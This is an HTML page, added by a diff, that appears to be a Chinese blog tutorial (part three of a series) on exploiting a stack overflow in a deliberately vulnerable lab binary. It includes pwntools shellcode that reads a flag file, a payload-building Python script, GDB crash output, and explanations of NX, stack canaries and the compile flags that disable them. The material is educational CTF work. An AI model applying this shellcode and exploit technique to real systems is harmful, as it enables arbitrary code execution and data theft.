@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>二进制安全之栈溢出（三） - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="二进制安全之栈溢出（三） - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/778/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>二进制安全之栈溢出（三）</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2017-10-22 12:46"><i class="iconfont icon-date"></i>2017-10-22 12:46</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>上一篇文章中控制了函数的返回地址，将地址修改为已有的指令地址，但是为了实现任意代码执行，是需要将返回地址修改为我们可以控制的 shellcode 的地址的。</p>
+
+<h2 id="shellcode">shellcode</h2>
+
+<p>在 http://docs.pwntools.com/en/stable/shellcraft/amd64.html#module-pwnlib.shellcraft.amd64.linux 有使用 pwntools 生成 shellcode 的文档。我选择了一个读取文件的 shellcode。</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">code</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s">"flag"</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">asm_code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">code</span>
+    <span class="o">/*</span> <span class="n">push</span> <span class="s">'flag</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*/</span>
+    <span class="n">push</span> <span class="mh">0x67616c66</span>
+    <span class="o">/*</span> <span class="n">call</span> <span class="nb">open</span><span class="p">(</span><span class="s">'rsp'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">'O_RDONLY'</span><span class="p">)</span> <span class="o">*/</span>
+    <span class="n">push</span> <span class="n">SYS_open</span> <span class="o">/*</span> <span class="mi">2</span> <span class="o">*/</span>
+    <span class="n">pop</span> <span class="n">rax</span>
+    <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rsp</span>
+    <span class="n">xor</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span> <span class="o">/*</span> <span class="mi">0</span> <span class="o">*/</span>
+    <span class="n">cdq</span> <span class="o">/*</span> <span class="n">rdx</span><span class="o">=</span><span class="mi">0</span> <span class="o">*/</span>
+    <span class="n">syscall</span>
+    <span class="o">/*</span> <span class="n">call</span> <span class="n">sendfile</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'rax'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2147483647</span><span class="p">)</span> <span class="o">*/</span>
+    <span class="n">mov</span> <span class="n">r10d</span><span class="p">,</span> <span class="mh">0x7fffffff</span>
+    <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rax</span>
+    <span class="n">push</span> <span class="n">SYS_sendfile</span> <span class="o">/*</span> <span class="mh">0x28</span> <span class="o">*/</span>
+    <span class="n">pop</span> <span class="n">rax</span>
+    <span class="n">push</span> <span class="mi">1</span>
+    <span class="n">pop</span> <span class="n">rdi</span>
+    <span class="n">cdq</span> <span class="o">/*</span> <span class="n">rdx</span><span class="o">=</span><span class="mi">0</span> <span class="o">*/</span>
+    <span class="n">syscall</span>
+
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
+<span class="s">'hflagj</span><span class="se">\x02</span><span class="s">XH</span><span class="se">\x89\xe7</span><span class="s">1</span><span class="se">\xf6\x99\x0f\x05</span><span class="s">A</span><span class="se">\xba\xff\xff\xff\x7f</span><span class="s">H</span><span class="se">\x89\xc6</span><span class="s">j(Xj</span><span class="se">\x01</span><span class="s">_</span><span class="se">\x99\x0f\x05</span><span class="s">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">asm_code</span><span class="p">)</span>
+<span class="mi">34</span>
+</code></pre>
+</div>
+
+<p>因为这段 shellcode 长度只有 34 个字节，完全可以塞入栈中，然后我们使用之前的办法，确定一个返回地址就可以了，这里就是 <code class="highlighter-rouge">student</code> 结构体的起始地址。</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">code</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s">"flag"</span><span class="p">)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">"linux"</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span>  <span class="s">"1925</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">"A"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x7fffffffe348</span> <span class="o">-</span> <span class="mh">0x7fffffffe2f0</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7fffffffe2f0</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="n">data</span>
+</code></pre>
+</div>
+
+<h2 id="nx-栈不可执行">NX 栈不可执行</h2>
+
+<p>在 GDB 中运行，会得到一个 SIGSEGV，并不会得到 flag。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
+Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; in.txt
+What's Your Birth?
+What's Your Name?
+You Are Born In 1094795585
+You Are Naive.
+You Speed One Second Here.
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x0
+RBX: 0x0
+RCX: 0x7ffff7b04290 (&lt;__write_nocancel+7&gt;:	cmp    rax,0xfffffffffffff001)
+RDX: 0x7ffff7dd3780 --&gt; 0x0
+RSI: 0x602010 ("You Speed One Second Here.\n")
+RDI: 0x1
+RBP: 0x4141414141414141 ('AAAAAAAA')
+RSP: 0x7fffffffe350 --&gt; 0x0
+RIP: 0x7fffffffe2f0 --&gt; 0x58026a67616c6668
+R8 : 0x2e6572654820646e ('nd Here.')
+R9 : 0x1b
+R10: 0x0
+R11: 0x246
+R12: 0x4005c0 (&lt;_start&gt;:	xor    ebp,ebp)
+R13: 0x7fffffffe420 --&gt; 0x1
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7fffffffe2ea:	add    bh,bh
+   0x7fffffffe2ec:	add    DWORD PTR [rax],eax
+   0x7fffffffe2ee:	add    BYTE PTR [rax],al
+=&gt; 0x7fffffffe2f0:	push   0x67616c66
+   0x7fffffffe2f5:	push   0x2
+   0x7fffffffe2f7:	pop    rax
+   0x7fffffffe2f8:	mov    rdi,rsp
+   0x7fffffffe2fb:	xor    esi,esi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe350 --&gt; 0x0
+0008| 0x7fffffffe358 --&gt; 0x7fffffffe428 --&gt; 0x7fffffffe6b4 ("/home/virusdefender/Desktop/pwn/new/vuln")
+0016| 0x7fffffffe360 --&gt; 0x1f7ffcca0
+0024| 0x7fffffffe368 --&gt; 0x4006b6 (&lt;main&gt;:	push   rbp)
+0032| 0x7fffffffe370 --&gt; 0x0
+0040| 0x7fffffffe378 --&gt; 0xd7d0880889372de6
+0048| 0x7fffffffe380 --&gt; 0x4005c0 (&lt;_start&gt;:	xor    ebp,ebp)
+0056| 0x7fffffffe388 --&gt; 0x7fffffffe420 --&gt; 0x1
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00007fffffffe2f0 in ?? ()
+</code></pre>
+</div>
+
+<p>而且可以看到我们的地址计算是没问题的，只是 shellcode 第一个指令就挂掉了。</p>
+
+<p>原因是并不是所有的内存区域都可执行的，使用 <code class="highlighter-rouge">vmmap</code> 可以看到，<code class="highlighter-rouge">0x00007fffffffe2f0</code> 所在的区域（<code class="highlighter-rouge">[stack]</code> 区域或者使用 <code class="highlighter-rouge">vmmap 0x00007fffffffe2f0</code>）是 <code class="highlighter-rouge">rw-p</code>，是没有 <code class="highlighter-rouge">x</code> 执行权限的。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r-xp	/home/virusdefender/Desktop/pwn/new/vuln
+0x00600000         0x00601000         r--p	/home/virusdefender/Desktop/pwn/new/vuln
+0x00601000         0x00602000         rw-p	/home/virusdefender/Desktop/pwn/new/vuln
+0x00602000         0x00623000         rw-p	[heap]
+0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7bcd000 0x00007ffff7dcd000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dcd000 0x00007ffff7dd1000 r--p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p	mapped
+0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7fda000 0x00007ffff7fdd000 rw-p	mapped
+0x00007ffff7ff6000 0x00007ffff7ff8000 rw-p	mapped
+0x00007ffff7ff8000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+</code></pre>
+</div>
+
+<p>这其实是 Linux 对漏洞利用的缓解措施中的一种，标记部分内存不可执行，使用 <code class="highlighter-rouge">checksec</code> 可以查看漏洞利用缓解措施的状态。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre>
+</div>
+
+<p><code class="highlighter-rouge">NX</code> 就是标记内存不可执行，这里是 <code class="highlighter-rouge">ENABLED</code> 状态。</p>
+
+<p><code class="highlighter-rouge">CANNARY</code> 是编译器会插入一些标记和检查指令，如果栈溢出的时候把它们覆盖了，那检查的时候就会导致导致进程退出。我们使用了 <code class="highlighter-rouge">-fno-stack-protector</code> 禁用了这个特性。</p>
+
+<p>其他的遇到的时候再说。</p>
+
+<p>所以我们应该使用的编译参数是 <code class="highlighter-rouge">gcc -g -O0 -fno-stack-protector -z execstack -o vuln main.c</code>，这样才可以正常运行 payload，最后的 SIGSEGV 是因为堆栈不平衡导致的。</p>
+
+<p>这样就可以看到 student 的内存区域是可执行的了。</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ vmmap 0x7fffffffe2f0
+Start              End                Perm	Name
+0x00007ffffffde000 0x00007ffffffff000 rwxp	[stack]
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ r &lt; in.txt
+Starting program: /home/virusdefender/Desktop/pwn/new/vuln &lt; in.txt
+What's Your Birth?
+What's Your Name?
+You Are Born In 1094795585
+You Are Naive.
+You Speed One Second Here.
+THIS_IS_FLAG
+
+Program received signal SIGSEGV, Segmentation fault.
+</code></pre>
+</div>
+
+<h2 id="参考">参考</h2>
+
+<ul>
+  <li><a href="https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/">https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/</a></li>
+  <li><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></li>
+  <li><a href="https://www.mattandreko.com/2011/12/17/exploit-exercises-protostar-stack-5/">https://www.mattandreko.com/2011/12/17/exploit-exercises-protostar-stack-5/</a></li>
+</ul>
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=二进制安全之栈溢出（三）&article_id=/index.php/archives/778/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
